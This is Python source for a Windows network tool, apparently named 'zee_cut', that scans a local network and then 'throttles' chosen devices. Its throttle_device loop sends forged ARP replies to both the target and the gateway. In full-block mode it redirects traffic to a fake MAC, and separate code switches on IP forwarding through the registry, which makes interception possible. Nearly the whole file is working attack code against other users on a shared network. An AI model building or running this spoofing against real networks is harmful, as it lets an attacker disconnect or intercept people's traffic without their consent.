"""
Network Scanner & ARP Throttler Engine
Handles network scanning, ARP spoofing for throttling, and device management.
Uses multiple scan methods for maximum device detection on Windows.
"""

import threading
import time
import socket
import struct
import uuid
import subprocess
import re
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import Optional, Callable

try:
    from scapy.all import (
        ARP, Ether, srp, sendp, getmacbyip, conf,
        get_if_list, get_if_addr, get_if_hwaddr, IFACES
    )
    from scapy.arch.windows import get_windows_if_list
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

import psutil


@dataclass
class NetworkDevice:
    """Represents a device found on the network."""
    ip: str
    mac: str
    hostname: str = "Unknown"
    vendor: str = "Unknown"
    is_gateway: bool = False
    is_throttled: bool = False
    is_self: bool = False
    last_seen: float = 0.0
    throttle_level: int = 100  # 0=full block, 50=half, 100=normal


@dataclass
class NetworkInterface:
    """Represents a network interface on this machine."""
    name: str
    display_name: str
    ip: str
    mac: str
    gateway_ip: str = ""
    gateway_mac: str = ""
    subnet_mask: str = "255.255.255.0"
    scapy_iface: object = None  # Store scapy interface reference


class NetworkEngine:
    """Core engine for network scanning and ARP-based throttling."""

    def __init__(self):
        self.log_file = (Path(__file__).resolve().parent.parent / "logs" / "network_engine.log")
        self._logger = self._build_logger()
        self.devices: dict[str, NetworkDevice] = {}
        self.interface: Optional[NetworkInterface] = None
        self._throttle_threads: dict[str, threading.Thread] = {}
        self._throttle_stop_events: dict[str, threading.Event] = {}
        self._scan_thread: Optional[threading.Thread] = None
        self._running = False
        self._hostname_cache: dict[str, str] = {}
        self._hostname_futures = {}
        self._hostname_lock = threading.Lock()
        self._hostname_executor = ThreadPoolExecutor(max_workers=8)
        self._ip_forwarding_original: Optional[int] = None
        self._ip_forwarding_enabled_by_app = False
        self.on_devices_updated: Optional[Callable] = None
        self.on_status_changed: Optional[Callable] = None
        self._logger.info("NetworkEngine initialized")

    def _build_logger(self) -> logging.Logger:
        """Build file logger for diagnostics."""
        logger = logging.getLogger("zee_cut.network_engine")
        logger.setLevel(logging.INFO)
        logger.propagate = False

        if not logger.handlers:
            self.log_file.parent.mkdir(parents=True, exist_ok=True)
            handler = logging.FileHandler(self.log_file, encoding="utf-8")
            handler.setFormatter(logging.Formatter(
                "%(asctime)s | %(levelname)s | %(message)s"
            ))
            logger.addHandler(handler)

        return logger

    def get_interfaces(self) -> list[NetworkInterface]:
        """Get all available network interfaces, matching psutil with scapy."""
        interfaces = []
        net_if = psutil.net_if_addrs()
        net_stats = psutil.net_if_stats()

        # Build scapy interface lookup by IP
        scapy_iface_map = {}
        if SCAPY_AVAILABLE:
            try:
                for iface in IFACES.values():
                    try:
                        ip = getattr(iface, 'ip', None) or getattr(iface, 'ips', [None])[0]
                        if ip and ip != '127.0.0.1' and ip != '0.0.0.0':
                            scapy_iface_map[ip] = iface
                    except Exception:
                        pass
            except Exception:
                pass

        for iface_name, addrs in net_if.items():
            if iface_name in net_stats and not net_stats[iface_name].isup:
                continue

            ipv4 = None
            mac = None
            subnet = "255.255.255.0"
            for addr in addrs:
                if addr.family == socket.AF_INET and addr.address != "127.0.0.1":
                    ipv4 = addr.address
                    subnet = addr.netmask or "255.255.255.0"
                elif addr.family == psutil.AF_LINK:
                    mac = addr.address

            if ipv4 and mac:
                gateway_ip = self._get_default_gateway(ipv4)
                scapy_if = scapy_iface_map.get(ipv4, None)

                iface = NetworkInterface(
                    name=iface_name,
                    display_name=iface_name,
                    ip=ipv4,
                    mac=mac.replace("-", ":").lower(),
                    gateway_ip=gateway_ip,
                    subnet_mask=subnet,
                    scapy_iface=scapy_if
                )
                interfaces.append(iface)

        return interfaces

    def _get_default_gateway(self, interface_ip: str) -> str:
        """Find the default gateway for the given interface IP."""
        try:
            result = subprocess.run(
                ["powershell", "-Command",
                 "Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -ExpandProperty NextHop"],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    line = line.strip()
                    if line and self._is_same_subnet(interface_ip, line):
                        return line
                lines = result.stdout.strip().split('\n')
                if lines and lines[0].strip():
                    return lines[0].strip()
        except Exception:
            pass

        # Fallback: try ipconfig
        try:
            result = subprocess.run(
                ["ipconfig"], capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                found_ip = False
                for line in lines:
                    if interface_ip in line:
                        found_ip = True
                    if found_ip and ('gateway' in line.lower() or 'gerbang' in line.lower()):
                        match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if match:
                            return match.group(1)
        except Exception:
            pass

        parts = interface_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.1"

    def _is_same_subnet(self, ip1: str, ip2: str, mask: str = "255.255.255.0") -> bool:
        """Check if two IPs are in the same subnet."""
        try:
            ip1_int = struct.unpack('!I', socket.inet_aton(ip1))[0]
            ip2_int = struct.unpack('!I', socket.inet_aton(ip2))[0]
            mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
            return (ip1_int & mask_int) == (ip2_int & mask_int)
        except Exception:
            return False

    def set_interface(self, interface: NetworkInterface):
        """Set the active network interface."""
        self.interface = interface

        # Also set scapy's default interface
        if SCAPY_AVAILABLE and interface.scapy_iface:
            try:
                conf.iface = interface.scapy_iface
                self._notify_status(
                    f"Interface: {interface.display_name} ({interface.ip}) - Scapy OK"
                )
            except Exception:
                self._notify_status(
                    f"Interface: {interface.display_name} ({interface.ip}) - Scapy fallback"
                )
        else:
            self._notify_status(f"Interface: {interface.display_name} ({interface.ip})")

    def scan_network(self, callback: Optional[Callable] = None, fast_mode: bool = True):
        """Scan devices on the selected network interface."""
        if not self.interface:
            self._notify_status("ERROR: No interface selected!")
            return

        def _scan():
            self._notify_status("Scanning network (multi-method)...")
            started_at = time.time()
            try:
                previous_devices = list(self.devices.values())
                previous_target_count = len([
                    d for d in previous_devices
                    if not d.is_self and not d.is_gateway
                ])
                previous_throttle_levels = {
                    ip: self.devices[ip].throttle_level
                    for ip in self._throttle_threads
                    if ip in self.devices
                }

                # Start each scan from a clean device list.
                # Do NOT flush ARP cache automatically because it can reduce
                # discovery accuracy for quiet/sleeping clients.
                self.devices.clear()

                # Method 1: ARP table from Windows (most reliable)
                self._notify_status("Step 1/3: Reading ARP table...")
                self._scan_arp_table()

                # Method 2: Scapy ARP broadcast (fast first)
                if SCAPY_AVAILABLE:
                    self._notify_status("Step 2/3: ARP scan (scapy)...")
                    if fast_mode:
                        self._scan_scapy_arp(timeout=2, retry=1)
                    else:
                        self._scan_scapy_arp(timeout=4, retry=2)

                # Method 3: Ping sweep fallback when quick discovery is too low
                discovered_targets = len([
                    d for d in self.devices.values()
                    if not d.is_self and not d.is_gateway
                ])
                self._logger.info(
                    "Scan quick pass targets=%s previous_targets=%s fast_mode=%s",
                    discovered_targets,
                    previous_target_count,
                    fast_mode
                )
                expected_min_targets = 2
                if previous_target_count > 0:
                    expected_min_targets = max(2, int(previous_target_count * 0.6))

                if not fast_mode or discovered_targets < expected_min_targets:
                    self._notify_status("Step 3/3: Ping sweep fallback...")
                    self._ping_sweep(timeout_ms=350, workers=48)
                    self._scan_arp_table()
                    if SCAPY_AVAILABLE:
                        self._scan_scapy_arp(timeout=2, retry=1)

                # Resolve gateway MAC
                self._resolve_gateway_mac()

                # Ensure self and gateway still exist in list even if they don't answer scan.
                self._add_or_update_device(self.interface.ip, self.interface.mac)
                self.devices[self.interface.ip].is_self = True
                if self.interface.gateway_ip and self.interface.gateway_mac:
                    self._add_or_update_device(self.interface.gateway_ip, self.interface.gateway_mac)
                    self.devices[self.interface.gateway_ip].is_gateway = True

                # Restore UI throttled state for active throttles.
                for ip, level in previous_throttle_levels.items():
                    if ip in self.devices and ip in self._throttle_threads:
                        self.devices[ip].is_throttled = True
                        self.devices[ip].throttle_level = level

                # Stop throttle threads for stale/offline IPs.
                active_ips = set(self.devices.keys())
                for ip in list(self._throttle_threads.keys()):
                    if ip not in active_ips:
                        self._logger.info("Stopping orphan throttle for stale ip=%s", ip)
                        self.restore_device(ip)

                device_count = len([d for d in self.devices.values()
                                   if not d.is_self and not d.is_gateway])
                elapsed = time.time() - started_at
                self._notify_status(f"Found {device_count} devices on network ({elapsed:.1f}s)")

                if self.on_devices_updated:
                    self.on_devices_updated()
                if callback:
                    callback()

            except Exception as e:
                self._notify_status(f"Scan error: {str(e)}")
                if callback:
                    callback()

        self._scan_thread = threading.Thread(target=_scan, daemon=True)
        self._scan_thread.start()

    def _scan_arp_table(self):
        """Read devices from Windows ARP table (arp -a)."""
        try:
            result = subprocess.run(
                ["arp", "-a"],
                capture_output=True, text=True, timeout=4,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode != 0:
                return

            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'

            for line in result.stdout.split('\n'):
                line = line.strip()
                # Parse: 192.168.1.1    aa-bb-cc-dd-ee-ff    dynamic
                match = re.match(
                    r'(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2})\s+(\w+)',
                    line
                )
                if match:
                    ip = match.group(1)
                    mac = match.group(2).replace('-', ':').lower()
                    entry_type = match.group(3).lower()

                    # Skip broadcast and multicast
                    if mac == 'ff:ff:ff:ff:ff:ff':
                        continue
                    if ip.endswith('.255'):
                        continue
                    if not ip.startswith(subnet_prefix):
                        continue

                    # Keep dynamic and static entries to improve detection accuracy.
                    if entry_type not in ('dynamic', 'dinamis', 'static', 'statis'):
                        continue

                    self._add_or_update_device(ip, mac)

        except Exception as e:
            self._notify_status(f"ARP table scan error: {e}")

    def _ping_sweep(self, timeout_ms: int = 250, workers: int = 64):
        """Fast parallel ping sweep to warm ARP cache."""
        try:
            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3])
            ips = [f"{subnet_prefix}.{i}" for i in range(1, 255)]

            def ping_ip(ip: str):
                try:
                    subprocess.run(
                        ["ping", "-n", "1", "-w", str(timeout_ms), ip],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=2,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except Exception:
                    pass

            with ThreadPoolExecutor(max_workers=workers) as pool:
                list(pool.map(ping_ip, ips))
        except Exception:
            pass

    def _scan_scapy_arp(self, timeout: int = 4, retry: int = 2):
        """Scan using scapy ARP requests."""
        if not SCAPY_AVAILABLE:
            return

        try:
            target_ip = self._get_network_range()

            arp_request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request

            # Use the mapped scapy interface if available
            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface

            answered, _ = srp(
                packet, timeout=timeout, verbose=False, retry=retry, iface=iface
            )

            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc.lower()
                self._add_or_update_device(ip, mac)

        except Exception as e:
            self._notify_status(f"Scapy ARP scan: {e}")

    def _resolve_gateway_mac(self):
        """Resolve the gateway MAC address."""
        if not self.interface or not self.interface.gateway_ip:
            return

        gw_ip = self.interface.gateway_ip

        # Check if gateway is already in devices
        if gw_ip in self.devices:
            self.interface.gateway_mac = self.devices[gw_ip].mac
            self.devices[gw_ip].is_gateway = True
            return

        # Try getmacbyip
        if SCAPY_AVAILABLE:
            try:
                gw_mac = getmacbyip(gw_ip)
                if gw_mac:
                    self.interface.gateway_mac = gw_mac.lower()
                    self._add_or_update_device(gw_ip, gw_mac.lower())
                    if gw_ip in self.devices:
                        self.devices[gw_ip].is_gateway = True
                    return
            except Exception:
                pass

        # Fallback: read from arp table
        try:
            result = subprocess.run(
                ["arp", "-a", gw_ip],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            for line in result.stdout.split('\n'):
                match = re.search(
                    r'([\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2})',
                    line
                )
                if match and gw_ip in line:
                    mac = match.group(1).replace('-', ':').lower()
                    if mac != 'ff:ff:ff:ff:ff:ff':
                        self.interface.gateway_mac = mac
                        self._add_or_update_device(gw_ip, mac)
                        if gw_ip in self.devices:
                            self.devices[gw_ip].is_gateway = True
                        return
        except Exception:
            pass

    def _add_or_update_device(self, ip: str, mac: str):
        """Add or update a device in the device list."""
        is_gateway = (ip == self.interface.gateway_ip) if self.interface else False
        is_self = (ip == self.interface.ip) if self.interface else False

        hostname = self._hostname_cache.get(ip, "Unknown")

        if ip in self.devices:
            dev = self.devices[ip]
            dev.mac = mac
            if hostname != "Unknown":
                dev.hostname = hostname
            dev.is_gateway = is_gateway
            dev.is_self = is_self
            dev.last_seen = time.time()
        else:
            self.devices[ip] = NetworkDevice(
                ip=ip,
                mac=mac,
                hostname=hostname,
                is_gateway=is_gateway,
                is_self=is_self,
                last_seen=time.time()
            )

        if hostname == "Unknown":
            self._queue_hostname_resolution(ip)

    def _queue_hostname_resolution(self, ip: str):
        """Resolve hostnames in background to avoid slowing down network scan."""
        with self._hostname_lock:
            if ip in self._hostname_cache:
                return

            pending = self._hostname_futures.get(ip)
            if pending and not pending.done():
                return

            future = self._hostname_executor.submit(self._resolve_hostname, ip)
            self._hostname_futures[ip] = future
            future.add_done_callback(
                lambda fut, target_ip=ip: self._on_hostname_resolved(target_ip, fut)
            )

    def _on_hostname_resolved(self, ip: str, future):
        try:
            hostname = future.result()
        except Exception:
            hostname = "Unknown"

        with self._hostname_lock:
            self._hostname_futures.pop(ip, None)
            self._hostname_cache[ip] = hostname

        if hostname != "Unknown" and ip in self.devices:
            self.devices[ip].hostname = hostname
            if self.on_devices_updated:
                self.on_devices_updated()

    def _get_network_range(self) -> str:
        """Calculate the network range from interface IP and subnet mask."""
        ip = self.interface.ip
        mask = self.interface.subnet_mask

        ip_int = struct.unpack('!I', socket.inet_aton(ip))[0]
        mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
        network_int = ip_int & mask_int

        cidr = bin(mask_int).count('1')
        network_ip = socket.inet_ntoa(struct.pack('!I', network_int))

        return f"{network_ip}/{cidr}"

    def _resolve_hostname(self, ip: str) -> str:
        """Try to resolve IP to hostname."""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except (socket.herror, socket.gaierror, OSError):
            return "Unknown"

    def _blackhole_mac(self, ip: str) -> str:
        """Generate a locally-administered fake MAC for hard block mode."""
        try:
            last_octet = int(ip.split('.')[-1]) & 0xFF
        except Exception:
            last_octet = 0
        return f"02:00:00:00:00:{last_octet:02x}"

    def _send_arp_reply(
        self,
        target_ip: str,
        target_mac: str,
        claimed_ip: str,
        claimed_mac: str,
        count: int = 1
    ):
        """Send ARP is-at via L2 with explicit Ethernet destination."""
        if not self.interface or not target_mac:
            return

        iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface

        # Keep Ethernet source as NIC MAC (default) to avoid AP anti-spoof side effects.
        unicast = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=claimed_ip,
            hwsrc=claimed_mac
        )
        sendp(unicast, verbose=False, count=count, iface=iface)

        # Also send broadcast is-at for clients that refresh ARP from broadcasts only.
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=claimed_ip,
            hwsrc=claimed_mac
        )
        sendp(broadcast, verbose=False, count=max(1, count // 2), iface=iface)

    def throttle_device(self, ip: str, level: int = 0):
        """
        Throttle a device using ARP spoofing.
        level: 0 = full block, 50 = intermittent, 100 = normal
        """
        if not SCAPY_AVAILABLE:
            self._notify_status("ERROR: Scapy not available!")
            return

        if ip not in self.devices:
            return

        device = self.devices[ip]
        if device.is_self or device.is_gateway:
            return

        if not self.interface or not self.interface.gateway_mac:
            self._notify_status("ERROR: Gateway MAC not found. Scan first!")
            return

        self.restore_device(ip)

        if level >= 100:
            return

        device.is_throttled = True
        device.throttle_level = level

        stop_event = threading.Event()
        self._throttle_stop_events[ip] = stop_event

        def _spoof_loop():
            self._notify_status(f"Throttling {ip} (level: {100 - level}%)")
            gateway_ip = self.interface.gateway_ip
            target_mac = device.mac
            self._logger.info(
                "Throttle start ip=%s level=%s iface_ip=%s gateway_ip=%s target_mac=%s gateway_mac=%s",
                ip,
                level,
                self.interface.ip if self.interface else "",
                gateway_ip,
                target_mac,
                self.interface.gateway_mac if self.interface else ""
            )
            spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else self.interface.mac

            while not stop_event.is_set():
                try:
                    # Spoofed ARP: tell target that gateway IP is at spoofed MAC
                    poison_count = 5 if level == 0 else 3
                    self._send_arp_reply(
                        target_ip=ip,
                        target_mac=target_mac,
                        claimed_ip=gateway_ip,
                        claimed_mac=spoof_hwsrc,
                        count=poison_count
                    )

                    # Spoofed ARP: tell gateway that target IP is at spoofed MAC
                    self._send_arp_reply(
                        target_ip=gateway_ip,
                        target_mac=self.interface.gateway_mac,
                        claimed_ip=ip,
                        claimed_mac=spoof_hwsrc,
                        count=poison_count
                    )

                    if level == 0:
                        stop_event.wait(0.2)
                    elif level <= 30:
                        stop_event.wait(0.8)
                    elif level <= 60:
                        stop_event.wait(1.5)
                    else:
                        stop_event.wait(3.0)

                except Exception as e:
                    self._notify_status(f"Spoof error for {ip}: {e}")
                    self._logger.exception("Spoof loop error ip=%s", ip)
                    stop_event.wait(2)

        thread = threading.Thread(target=_spoof_loop, daemon=True)
        self._throttle_threads[ip] = thread
        thread.start()

    def restore_device(self, ip: str):
        """Restore a device to normal network operation."""
        if ip in self._throttle_stop_events:
            self._throttle_stop_events[ip].set()
            del self._throttle_stop_events[ip]

        if ip in self._throttle_threads:
            thread = self._throttle_threads[ip]
            thread.join(timeout=3)
            del self._throttle_threads[ip]

        if ip in self.devices:
            device = self.devices[ip]

            if self.interface and not device.is_self and not device.is_gateway:
                try:
                    if not self.interface.gateway_mac:
                        self._resolve_gateway_mac()
                    if not self.interface.gateway_mac:
                        self._scan_arp_table()
                        self._resolve_gateway_mac()

                    if self.interface.gateway_mac:
                        # Send multiple corrective ARP bursts so recovery is faster.
                        for _ in range(3):
                            # Correct ARP to target (gateway IP -> gateway MAC)
                            self._send_arp_reply(
                                target_ip=ip,
                                target_mac=device.mac,
                                claimed_ip=self.interface.gateway_ip,
                                claimed_mac=self.interface.gateway_mac,
                                count=7
                            )

                            # Correct ARP to gateway (target IP -> target MAC)
                            self._send_arp_reply(
                                target_ip=self.interface.gateway_ip,
                                target_mac=self.interface.gateway_mac,
                                claimed_ip=ip,
                                claimed_mac=device.mac,
                                count=7
                            )
                            time.sleep(0.2)

                        self._notify_status(f"Restored {ip} to normal")
                    else:
                        self._notify_status(
                            f"Restore warning for {ip}: gateway MAC not found, recovery may be slower"
                        )
                except Exception as e:
                    self._notify_status(f"Restore error for {ip}: {e}")
                    self._logger.exception("Restore error ip=%s", ip)

            device.is_throttled = False
            device.throttle_level = 100

    def restore_all(self):
        """Restore all throttled devices."""
        throttled = [ip for ip, dev in self.devices.items() if dev.is_throttled]
        for ip in throttled:
            self.restore_device(ip)
        self._notify_status("All devices restored to normal")

    def cleanup(self):
        """Clean up all spoofing before exit."""
        self._running = False
        self.restore_all()
        try:
            self._hostname_executor.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass

    def _notify_status(self, message: str):
        """Send status update."""
        self._logger.info(message)
        if self.on_status_changed:
            self.on_status_changed(message)

    def is_admin(self) -> bool:
        """Check if running with admin/elevated privileges."""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    def _read_ip_forwarding_state(self) -> Optional[int]:
        """Read IPEnableRouter registry value (0/1)."""
        try:
            result = subprocess.run(
                [
                    "reg", "query",
                    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                    "/v", "IPEnableRouter"
                ],
                capture_output=True,
                text=True,
                timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode != 0:
                return None

            match = re.search(r"IPEnableRouter\s+REG_DWORD\s+0x([0-9a-fA-F]+)", result.stdout)
            if not match:
                return None

            return int(match.group(1), 16)
        except Exception:
            return None

    def enable_ip_forwarding(self):
        """Enable IP forwarding on Windows."""
        try:
            current_state = self._read_ip_forwarding_state()
            self._ip_forwarding_original = current_state

            if current_state == 1:
                self._ip_forwarding_enabled_by_app = False
                self._notify_status("IP Forwarding already enabled")
                return

            subprocess.run(
                ["powershell", "-Command",
                 "Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            result = subprocess.run(
                ["reg", "add",
                 "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self._ip_forwarding_enabled_by_app = (
                result.returncode == 0 and current_state == 0
            )
            if result.returncode == 0:
                self._notify_status("IP Forwarding enabled")
            else:
                self._notify_status("Failed to enable IP Forwarding")
        except Exception as e:
            self._notify_status(f"Failed to enable IP forwarding: {e}")

    def disable_ip_forwarding(self):
        """Disable IP forwarding on Windows."""
        if not self._ip_forwarding_enabled_by_app:
            self._logger.info(
                "Skip disabling IP forwarding because app did not enable it."
            )
            return

        try:
            target_state = 0 if self._ip_forwarding_original != 1 else 1
            subprocess.run(
                ["powershell", "-Command",
                 f"Set-NetIPInterface -Forwarding {'Enabled' if target_state == 1 else 'Disabled'} -ErrorAction SilentlyContinue"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            subprocess.run(
                ["reg", "add",
                 "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", str(target_state), "/f"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self._notify_status("IP Forwarding restored to previous state")
        except Exception:
            pass
        finally:
            self._ip_forwarding_enabled_by_app = False
            self._ip_forwarding_original = None

    def flush_arp_cache(self, notify: bool = True) -> tuple[bool, str]:
        """Flush Windows ARP cache (requires admin rights)."""
        commands = [
            ["cmd", "/c", "arp -d *"],
            ["netsh", "interface", "ip", "delete", "arpcache"],
        ]

        for cmd in commands:
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=10,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if result.returncode == 0:
                    message = "ARP cache flushed."
                    if notify:
                        self._notify_status(message)
                    else:
                        self._logger.info(message)
                    return True, message
            except Exception:
                continue

        message = "Failed to flush ARP cache. Run app as Administrator."
        if notify:
            self._notify_status(message)
        else:
            self._logger.warning(message)
        return False, message

